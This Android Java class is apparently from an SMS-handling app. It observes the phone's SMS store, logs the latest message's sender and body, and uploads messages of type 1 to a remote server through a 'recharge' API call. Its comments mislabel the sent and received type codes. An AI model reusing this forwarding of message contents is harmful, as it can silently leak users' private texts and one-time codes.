package com.vogue.sms.brodcast;


import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;

import com.vogue.sms.net.Retrofit2See;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SMSObserver extends ContentObserver {

    private Context context;
    private Retrofit2See retrofit2See;
    public static final int MSG_RECEIVED_CODE = 1001;
    public SMSObserver(Context context, Handler handler) {
        super(handler);
        this.context = context;
        retrofit2See=new Retrofit2See(context);
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);
        ContentResolver resolver = context.getContentResolver();

        Cursor cursor = resolver.query(uri, new String[]{"address","body","type","date"}, null, null, "date desc"); // 查询语句

        if (cursor.moveToFirst()){
            String address = cursor.getString(0);//号码
            String body = cursor.getString(1);//内容
            int type = cursor.getInt(2);// 1,表示发送短信，2是表示接收短信
            long date = cursor.getLong(3);//时间
            //将日期格式化，按这个模式输出日期
            String time = new SimpleDateFormat("yyy-MM-dd hh:mm:ss").format(new Date(date));
            //type=1,表示发送短信，而type=2是表示接收短信，这个可以默认系统短信的数据库表导出来看一下

            Log.e("TTTTT",address+"  "+body+"  "+type+"  "+time);
            if(type ==1 ){
                Call<com.vogue.sms.net.R> call = retrofit2See.seeApi.recharge(address,time,body);
                call.enqueue(new Callback<com.vogue.sms.net.R>() {
                    @Override
                    public void onResponse(Call<com.vogue.sms.net.R> call, Response<com.vogue.sms.net.R> response) {
                        Log.i("Observer", response.code() + "");
                        if (response.body() != null) {
                            Log.d("Observer",response.body().getMsg());
                        } else {
                            Toast.makeText(context,"请求失败",Toast.LENGTH_LONG).show();
                        }
                    }
                    @Override
                    public void onFailure(Call<com.vogue.sms.net.R> call, Throwable t) {
                        Toast.makeText(context,"网络连接错误，请稍后重试",Toast.LENGTH_LONG).show();
                    }
                });
            }
            if(type == 2){
                Log.i("Observer",  "有短信发出");
            }
        }

    }


}
